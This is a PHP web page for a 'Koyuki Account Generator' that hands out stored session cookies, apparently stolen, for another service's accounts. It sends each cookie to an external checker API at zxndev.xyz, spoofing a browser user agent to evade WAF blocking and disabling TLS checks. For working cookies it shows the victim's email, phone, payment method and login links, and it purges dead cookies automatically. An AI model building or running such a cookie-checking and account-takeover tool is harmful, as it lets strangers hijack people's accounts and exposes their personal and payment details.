<?php
session_start();
if (!isset($_SESSION['user_logged_in']) || $_SESSION['user_logged_in'] !== true) {
    header("Location: auth.php");
    exit;
}
require_once 'db.php';

if (isset($pdo) && isset($_SESSION['user_username'])) {
    $stmt = $pdo->prepare("SELECT status FROM users WHERE username = ?");
    $stmt->execute([$_SESSION['user_username']]);
    $status = $stmt->fetchColumn();
    if ($status !== 'approved') {
        session_destroy();
        header("Location: auth.php?error=revoked");
        exit;
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: auth.php");
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'get_cookie') {
    header('Content-Type: application/json');
    if (!isset($pdo)) {
        echo json_encode(['error' => 'Database connection missing. Check db.php.']);
        exit;
    }
    try {
        $stmt = $pdo->query("SELECT id, cookie_data FROM active_accounts ORDER BY RANDOM() LIMIT 1");
        $cookie = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($cookie) {
            echo json_encode(['success' => true, 'id' => $cookie['id'], 'cookie_data' => $cookie['cookie_data']]);
        } else {
            echo json_encode(['success' => false, 'error' => 'No accounts available in the Databank.']);
        }
    } catch (\PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['action']) && $_GET['action'] === 'delete_cookie') {
    $data = json_decode(file_get_contents('php://input'), true);
    if (isset($pdo) && isset($data['id'])) {
        $stmt = $pdo->prepare("DELETE FROM active_accounts WHERE id = ?");
        $stmt->execute([$data['id']]);
        echo json_encode(['success' => true]);
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['action']) && $_GET['action'] === 'check_api') {
    $raw_post_data = file_get_contents('php://input');
    $json_data = json_decode($raw_post_data, true);

    if (isset($json_data['cookie'])) {
        
        // Suppress PHP warnings from corrupting the JSON output
        error_reporting(0);
        
        $api_url = "https://zxndev.xyz/api/v1/check";
        // Dynamically request API Key from Heroku Config Vars
        $api_key = getenv('ZNF_API_KEY'); 

        $safe_cookie = mb_convert_encoding($json_data['cookie'], 'UTF-8', 'UTF-8');
        $payload = json_encode(['cookie_data' => $safe_cookie], JSON_UNESCAPED_SLASHES);

        $ch = curl_init($api_url);
        $responseHeaders = [];

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        
        // Added standard Chrome User-Agent to prevent Cloudflare/WAF blocking datacenter IPs
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Accept: application/json',
            'X-API-Key: ' . $api_key,
            'Expect:' 
        ]);

        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($ch, $header) use (&$responseHeaders) {
            $length = strlen($header);
            if (strpos($header, ':') !== false) {
                list($key, $value) = explode(':', $header, 2);
                $responseHeaders[strtolower(trim($key))] = trim($value);
            }
            return $length;
        });

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code === 429 && isset($responseHeaders['retry-after'])) {
            header('Retry-After: ' . $responseHeaders['retry-after']);
        }

        http_response_code($http_code);
        header('Content-Type: application/json');
        echo $response ?: json_encode(['error' => 'Empty API response']);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Koyuki | Account Generator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <!-- Premium Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Faculty+Glyphic&family=Rye&display=swap" rel="stylesheet">
    <style>
        :root {
            /* Cold as Ice Palette */
            --primary: #00e5ff;       
            --secondary: #0055ff;     
            --bg-dark: #020813;       
            --card-bg: rgba(4, 12, 24, 0.65);
            --card-border: rgba(0, 229, 255, 0.25);
            --text-main: #f0f8ff;
            --text-muted: #7fa4c9;
        }

        body { 
            background: radial-gradient(ellipse at 50% 0%, #003366 0%, var(--bg-dark) 70%);
            color: var(--text-main); 
            font-family: 'Faculty Glyphic', sans-serif; 
            padding-top: 80px; 
            min-height: 100vh;
            background-attachment: fixed;
            display: flex;
            flex-direction: column;
        }
        
        .rye-font { font-family: 'Rye', serif; font-weight: normal; }

        .premium-card { 
            background: var(--card-bg); 
            border: 1px solid var(--card-border); 
            border-radius: 24px; 
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
        }

        .glow-text {
            background: linear-gradient(to right, #00e5ff, #8ab4f8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 229, 255, 0.4);
        }

        .btn-premium { 
            background: linear-gradient(135deg, var(--secondary), var(--primary)); 
            border: none; 
            border-radius: 16px; 
            font-weight: 700; 
            color: white;
            box-shadow: 0 10px 25px -5px rgba(0, 229, 255, 0.3);
            transition: all 0.3s ease;
            text-transform: uppercase;
        }
        .btn-premium:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(0, 229, 255, 0.5); color: white; }
        .btn-premium:disabled { opacity: 0.6; cursor: not-allowed; transform: scale(0.98); }

        .result-item { 
            background: rgba(2, 6, 23, 0.6);
            border: 1px solid rgba(0, 229, 255, 0.15); 
            border-radius: 16px;
            padding: 16px; 
            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
        }
        @media (min-width: 640px) { .result-item { padding: 24px; } }

        .status-badge { font-size: 10px; padding: 6px 14px; border-radius: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        .status-success { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }

        .action-btn {
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1); color: var(--text-muted);
            border-radius: 10px; transition: all 0.2s; font-size: 13px; font-weight: 600;
        }
        .action-btn:hover { background: var(--primary); border-color: var(--primary); color: white; text-decoration: none; box-shadow: 0 0 10px rgba(0, 229, 255, 0.3); }

        .detail-label { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 4px;}
        .detail-value { font-size: 14px; font-weight: 500; color: var(--text-main); word-break: break-word; }
        
        .pulse-border { animation: borderPulse 2s infinite; }
        @keyframes borderPulse { 0% { border-color: rgba(0, 229, 255, 0.2); } 50% { border-color: rgba(0, 229, 255, 0.8); box-shadow: 0 0 15px rgba(0, 229, 255, 0.4); } 100% { border-color: rgba(0, 229, 255, 0.2); } }
        nav a, nav a:hover { text-decoration: none !important; }
    </style>
</head>
<body>

<nav class="fixed top-0 left-0 w-full z-50 bg-[#020613]/80 backdrop-blur-md border-b border-[rgba(0,229,255,0.2)] shadow-[0_4px_30px_rgba(0,0,0,0.5)]">
    <div class="max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-8">
        <div class="flex items-center justify-between h-20">
            <div class="flex items-center gap-2 sm:gap-3">
                <img src="logo.png" alt="Logo" class="h-8 w-8 sm:h-10 sm:w-10 object-cover rounded-lg border border-[#00e5ff]/40 shadow-[0_0_15px_rgba(0,229,255,0.4)]" onerror="this.onerror=null; this.src='https://via.placeholder.com/40/00e5ff/ffffff?text=K';">
                <span class="rye-font text-xl sm:text-2xl tracking-wide glow-text mt-1">Koyuki Generator</span>
            </div>
            
            <div class="hidden sm:flex items-center gap-4">
                <span class="text-sm font-medium text-slate-300">Welcome, <strong class="text-[#00e5ff]"><?php echo htmlspecialchars($_SESSION['user_username'] ?? 'User'); ?></strong></span>
                <a href="index.php" class="text-sm font-bold text-slate-300 hover:text-[#00e5ff] transition-colors uppercase tracking-wider ml-2">Checker</a>
                <a href="?action=logout" class="bg-[rgba(248,113,113,0.1)] border border-[rgba(248,113,113,0.3)] text-red-400 hover:bg-red-500 hover:text-white px-4 py-2 rounded-xl text-sm font-semibold transition-all shadow-[0_0_10px_rgba(248,113,113,0.1)] hover:shadow-[0_0_15px_rgba(248,113,113,0.4)] ml-2"><i class="fas fa-sign-out-alt mr-2"></i> Disconnect</a>
            </div>
            
            <div class="sm:hidden flex items-center">
                <button id="mobileMenuBtn" class="text-[#00e5ff] hover:text-white focus:outline-none text-2xl transition-colors p-2"><i class="fas fa-bars"></i></button>
            </div>
        </div>
    </div>
    <div id="mobileMenu" class="hidden sm:hidden bg-[#020813] border-t border-[rgba(0,229,255,0.1)] py-4 px-6 shadow-[0_10px_30px_rgba(0,0,0,0.8)]">
        <div class="flex flex-col gap-4">
            <span class="text-xs font-medium text-slate-400 uppercase tracking-wider mb-2">Welcome, <strong class="text-[#00e5ff]"><?php echo htmlspecialchars($_SESSION['user_username'] ?? 'User'); ?></strong></span>
            <a href="index.php" class="text-sm font-bold text-slate-300 hover:text-[#00e5ff] transition-colors uppercase tracking-wider flex items-center">Checker</a>
            <a href="?action=logout" class="text-sm font-bold text-red-400 hover:text-red-500 transition-colors uppercase tracking-wider flex items-center mt-2 pt-4 border-t border-[rgba(248,113,113,0.1)]"><i class="fas fa-sign-out-alt w-6 text-left mr-2"></i> Disconnect</a>
        </div>
    </div>
</nav>

<div class="container-fluid pb-5 px-3 sm:px-4 flex-grow" style="max-width: 800px; margin-top: 20px; margin-bottom: 40px;">
    <div class="premium-card p-5 md:p-8 mb-5 relative overflow-hidden text-center">
        <div class="absolute top-0 right-0 w-64 h-64 bg-cyan-400/10 rounded-full blur-3xl -mr-20 -mt-20 pointer-events-none"></div>
        <div class="absolute bottom-0 left-0 w-48 h-48 bg-blue-600/10 rounded-full blur-3xl -ml-20 -mb-20 pointer-events-none"></div>

        <div class="relative z-10">
            <img src="logo.png" alt="Koyuki Logo" class="h-20 w-20 sm:h-24 sm:w-24 object-cover rounded-full border border-[#00e5ff]/30 mx-auto mb-4 shadow-[0_0_20px_rgba(0,229,255,0.4)]" onerror="this.onerror=null; this.src='https://via.placeholder.com/96/00e5ff/ffffff?text=K';">
            <h1 class="rye-font text-3xl sm:text-4xl text-slate-200 mb-2 glow-text">Auto-Generator</h1>
            <p class="text-[#7fa4c9] text-sm sm:text-base mb-6 sm:mb-8">Pulls a saved payload from the databank, verifies it live, and automatically purges it if expired.</p>
            
            <button id="generateBtn" class="btn btn-premium w-full max-w-full py-3 sm:py-4 text-[13px] sm:text-lg lg:text-xl tracking-wider sm:tracking-[2px] pulse-border flex items-center justify-center mx-auto" style="white-space: normal; word-wrap: break-word;" onclick="startGenerationFlow()">
                <i class="fas fa-cogs mr-2 flex-shrink-0 hidden sm:inline-block"></i> <span>GENERATE ACCOUNT</span>
            </button>

            <div id="statusWrapper" class="mt-6 bg-[#040c18] px-3 sm:px-4 py-3 rounded-xl border border-[rgba(0,229,255,0.2)] shadow-[inset_0_0_10px_rgba(0,0,0,0.5)]" style="display: none;">
                <span id="statusText" class="text-[#00e5ff] font-semibold text-xs sm:text-sm"></span>
            </div>
        </div>
    </div>

    <div id="resultBox" class="mt-4"></div>
</div>

<footer class="w-full border-t border-[rgba(0,229,255,0.15)] bg-[#020613]/80 backdrop-blur-md mt-auto py-6 text-center z-10 relative">
    <div class="max-w-[1200px] mx-auto px-4">
        <p class="text-[#7fa4c9] text-xs sm:text-sm font-medium tracking-wider">
            &copy; 2026 Koyuki NF Checker. All rights reserved &nbsp;<span class="text-[rgba(0,229,255,0.5)] hidden sm:inline">|</span><br class="sm:hidden"> 
            <span class="mt-2 sm:mt-0 inline-block">Powered by <span class="text-white font-bold">ZXNDEV</span></span>
        </p>
    </div>
</footer>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        const btn = document.getElementById('mobileMenuBtn'); const menu = document.getElementById('mobileMenu');
        if(btn && menu) {
            btn.addEventListener('click', function() {
                menu.classList.toggle('hidden'); const icon = btn.querySelector('i');
                if(menu.classList.contains('hidden')) { icon.classList.remove('fa-times'); icon.classList.add('fa-bars'); } else { icon.classList.remove('fa-bars'); icon.classList.add('fa-times'); }
            });
        }
    });

    function copyCardDetails(encodedStr) {
        try {
            const decodedStr = decodeURIComponent(escape(atob(encodedStr)));
            const tempTextArea = document.createElement("textarea");
            tempTextArea.value = decodedStr;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand("copy");
            document.body.removeChild(tempTextArea);
            Swal.fire({ toast: true, position: 'top-end', icon: 'success', iconColor: '#00e5ff', title: '> DETAILS_COPIED', showConfirmButton: false, timer: 2000, background: '#020613', color: '#00e5ff', customClass: { popup: 'border border-[rgba(0,229,255,0.3)] font-mono text-sm sm:text-base' } });
        } catch (err) {
            Swal.fire({ title: 'ERR', text: 'Copy failed.', icon: 'error', background: '#020613' });
        }
    }

    function createResultElement(data, originalCookie) {
        const details = data.accountDetails || {}; const links = data.watchLinks || {};
        let planStr = details.plan || 'N/A'; let isPremium = planStr.toLowerCase().includes('premium'); let planColor = isPremium ? '#34d399' : '#00e5ff';
        let rawProfiles = details.profiles || data.profiles || 'N/A'; let profilesHtml = '';
        if (rawProfiles === 'N/A') { profilesHtml = `<span class="text-slate-500 text-sm">N/A</span>`; } else {
            let profArray = Array.isArray(rawProfiles) ? rawProfiles : String(rawProfiles).split(',');
            profilesHtml = profArray.map(p => `<span class="inline-block bg-[rgba(0,229,255,0.1)] text-[#00e5ff] px-3 py-1.5 rounded-full text-xs font-semibold border border-[rgba(0,229,255,0.3)] mr-2 mb-2"><i class="fas fa-user-circle mr-1.5 opacity-80"></i>${p.trim()}</span>`).join('');
        }
        let directLink = links.pc || '#'; let mobileLink = links.mobile || '#'; let tvLink = links.tv || '#'; let displayedEmail = details.email || 'Valid Account / Hidden Email';
        let copyText = `Email: ${displayedEmail}\nPhone: ${details.phone || 'N/A'}\nProfiles: ${rawProfiles}\nSubscription Plan: ${planStr}\nCountry: ${details.country || 'N/A'}\nPayment Method: ${details.paymentMethod || 'N/A'}\n\nDirect Watch:\n${directLink}\n\nMobile Watch:\n${mobileLink}\n\nTV Watch:\n${tvLink}\n\nOriginal Data:\n${originalCookie}`;
        let base64CopyData = btoa(unescape(encodeURIComponent(copyText)));

        return `
        <div class="result-item" style="animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);">
            <div class="d-flex flex-col sm:flex-row justify-content-between align-items-start mb-3 border-b border-[rgba(0,229,255,0.15)] pb-3 gap-2 sm:gap-0">
                <div><span class="status-badge status-success"><i class="fas fa-check-circle mr-1"></i> VALID ACCOUNT</span></div>
                <h5 class="text-white font-bold m-0 text-lg sm:text-xl break-all sm:break-normal" style="text-shadow: 0 0 10px rgba(255,255,255,0.2);">${displayedEmail}</h5>
            </div>
            <div class="row g-3 mb-4">
                <div class="col-6"><div class="detail-label">Subscription Plan</div><div class="detail-value" style="color: ${planColor}; font-weight: 700;">${planStr} <i class="${isPremium ? 'fas fa-crown ml-1' : ''}"></i></div></div>
                <div class="col-6"><div class="detail-label">Country</div><div class="detail-value">${details.country || 'N/A'}</div></div>
                <div class="col-6"><div class="detail-label">Payment Method</div><div class="detail-value">${details.paymentMethod || 'N/A'}</div></div>
                <div class="col-6"><div class="detail-label">Phone Linked</div><div class="detail-value">${details.phone || 'N/A'}</div></div>
                <div class="col-12 mt-2 pt-3 border-t border-[rgba(0,229,255,0.15)]"><div class="detail-label mb-2">Active Profiles</div><div class="mt-1 flex flex-wrap">${profilesHtml}</div></div>
            </div>
            <div class="flex flex-col sm:flex-row gap-2 mb-2">
                <a href="${directLink}" target="_blank" class="btn action-btn flex-fill py-3 sm:py-2 text-center"><i class="fas fa-desktop mr-2 text-[#00e5ff]"></i> PC Watch</a>
                <a href="${mobileLink}" target="_blank" class="btn action-btn flex-fill py-3 sm:py-2 text-center"><i class="fas fa-mobile-alt mr-2 text-emerald-400"></i> Mobile Watch</a>
                <a href="${tvLink}" target="_blank" class="btn action-btn flex-fill py-3 sm:py-2 text-center"><i class="fas fa-tv mr-2 text-amber-400"></i> TV Login</a>
            </div>
            <button onclick="copyCardDetails('${base64CopyData}')" class="btn action-btn w-100 py-3 mt-2 border-[rgba(0,229,255,0.3)] hover:border-[#00e5ff] text-[#00e5ff] uppercase tracking-wider font-bold"><i class="fas fa-copy mr-2"></i> Copy Full Details</button>
        </div>`;
    }

    async function startGenerationFlow() {
        const btn = document.getElementById('generateBtn'); const statusWrapper = document.getElementById('statusWrapper'); const resultBox = document.getElementById('resultBox');
        btn.disabled = true; resultBox.innerHTML = ''; statusWrapper.style.display = 'block';
        await processDatabaseCookie();
    }

    async function processDatabaseCookie() {
        const statusText = document.getElementById('statusText'); const btn = document.getElementById('generateBtn');
        try {
            statusText.innerHTML = '<i class="fas fa-search fa-spin mr-2"></i> Searching Databank...';
            let dbRes = await fetch('?action=get_cookie'); let dbData = await dbRes.json();
            if (!dbData.success) { statusText.innerHTML = `<i class="fas fa-exclamation-triangle text-amber-400 mr-2"></i> ${dbData.error}`; btn.disabled = false; return; }

            const dbId = dbData.id; const cookieData = dbData.cookie_data;
            statusText.innerHTML = '<i class="fas fa-satellite-dish fa-spin text-[#00e5ff] mr-2"></i> Validating Account via API...';
            
            let apiRes = await fetch('?action=check_api', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie: cookieData }) });

            if (apiRes.status === 429) {
                let retryAfter = apiRes.headers.get('Retry-After') || 5;
                statusText.innerHTML = `<i class="fas fa-hourglass-half text-amber-400 mr-2"></i> API Rate Limit. Retrying in ${retryAfter}s...`;
                await new Promise(r => setTimeout(r, retryAfter * 1000));
                return processDatabaseCookie(); 
            }

            const rawResponseText = await apiRes.text();
            let apiData;
            
            // NEW ERROR CATCHING LOGIC
            try { 
                apiData = JSON.parse(rawResponseText); 
            } catch (e) { 
                // Strips the HTML tags from the response so we can read the raw error directly on screen
                let cleanResponse = rawResponseText.replace(/(<([^>]+)>)/gi, "").substring(0, 100);
                throw new Error(`API returned HTML instead of JSON. Server says: "${cleanResponse}..."`);
            }

            const verdictStr = (apiData.verdict || '').toLowerCase(); const signalStr = (apiData.matchedSignal || '').toLowerCase();
            const isSuccess = ['accepted', 'working', 'live', 'valid', 'success'].includes(verdictStr) || signalStr.includes('active auth path') || signalStr.includes('membership found') || signalStr.includes('confirmed');

            if (isSuccess) {
                statusText.innerHTML = '<i class="fas fa-check-circle text-emerald-400 mr-2"></i> Working Account Generated!';
                document.getElementById('resultBox').innerHTML = createResultElement(apiData, cookieData);
                btn.disabled = false;
            } else {
                statusText.innerHTML = '<i class="fas fa-trash-alt text-red-400 mr-2"></i> Account expired! Auto-purging database...';
                await fetch('?action=delete_cookie', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: dbId }) });
                setTimeout(() => { processDatabaseCookie(); }, 1000);
            }

        } catch (err) {
            statusText.innerHTML = `<i class="fas fa-times-circle text-red-400 mr-2"></i> Error: ${err.message}`;
            btn.disabled = false;
        }
    }
</script>

<style>
    @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
</style>

</body>
</html>
